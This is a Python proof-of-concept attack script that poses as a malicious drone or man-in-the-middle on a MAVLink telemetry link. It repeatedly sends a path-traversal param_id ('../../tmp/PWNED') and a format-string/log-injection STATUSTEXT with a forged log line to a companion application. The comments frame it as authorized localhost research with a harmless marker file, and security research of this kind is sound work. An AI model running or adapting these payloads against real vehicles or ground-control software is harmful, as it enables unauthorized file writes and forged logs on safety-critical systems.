#!/usr/bin/env python3
# ============================================================================
#  DRONEKIT-01 attacker driver -- emits hostile param_id + STATUSTEXT
# ============================================================================
#  This PoC is SELF-CONTAINED (no external import).
#
#  Models a malicious vehicle / MITM on the telemetry link pushing:
#    * a PARAM_VALUE whose param_id is a path-traversal string, and
#    * a STATUSTEXT whose text contains a '%'-format / log-injection payload.
#
#  Benign by design: the traversal target is a marker filename under /tmp; the
#  STATUSTEXT carries a harmless '%s%s%n-style' token to prove the text reaches
#  a format-string sink. Authorized localhost-only research.
#
#  Run it as the TCP server the companion connects to (SITL-style):
#      python attack_send.py --listen 127.0.0.1:5760
# ============================================================================
import os
import sys
import time
...
# import). Defines FakeVehicle, banner, observe, warn, ok, attack (+ wire
# helpers).
# ============================================================================
import argparse
import socket
...
def main():
    banner("DRONEKIT-01  hostile param_id + STATUSTEXT -> app callbacks")
    v = FakeVehicle.from_cli("DRONEKIT-01 trust-boundary handoff")
    v.start()
    # For tcpin (server) role, wait until the companion has actually connected
    # so our one-shot sends are not dropped before accept().
    v.wait_for_gcs(timeout=120)

    # payload 1: path-traversal param_id (char[16]) -> lands a marker file
    #            above the companion's intended export dir.
    hostile_param = "../../tmp/PWNED"          # 15 bytes, fits char[16]
    # payload 2: format-string / log-injection STATUSTEXT.
    hostile_text = "ok %s%s%s INJECTED\nFAKE 2099 forged-line"

    # Re-emit on a loop. Telemetry streams (PARAM_VALUE / STATUSTEXT) are
    # fire-and-forget; a vehicle naturally repeats them, and re-emitting makes
    # the PoC robust to the companion still being in wait_heartbeat() when we
    # first fire. Ctrl-C to stop.
    attack("emitting PARAM_VALUE param_id=%r (looping)" % hostile_param)
    attack("emitting STATUSTEXT text=%r (looping)" % hostile_text)
    try:
        while True:
            v.send_param_value(hostile_param, 1337.0)
            v.send_statustext(hostile_text)
            time.sleep(2.0)
    except KeyboardInterrupt:
        ok("stopped")
